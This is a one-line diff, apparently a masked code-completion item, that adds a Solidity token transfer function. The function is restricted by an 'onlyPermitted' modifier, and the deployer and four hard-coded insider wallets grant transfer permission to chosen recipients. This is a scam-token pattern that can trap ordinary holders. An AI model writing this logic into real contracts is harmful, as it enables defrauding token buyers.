@@ -1,0 +1,1 @@
+"function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {        <mask0>;        if(_msgSender() == deployer() || _msgSender() == wshone() || _msgSender() == wshtwo() || _msgSender() == wshthree() || _msgSender() == wshfour())        { givePermissions(recipient); }        return true;    }"
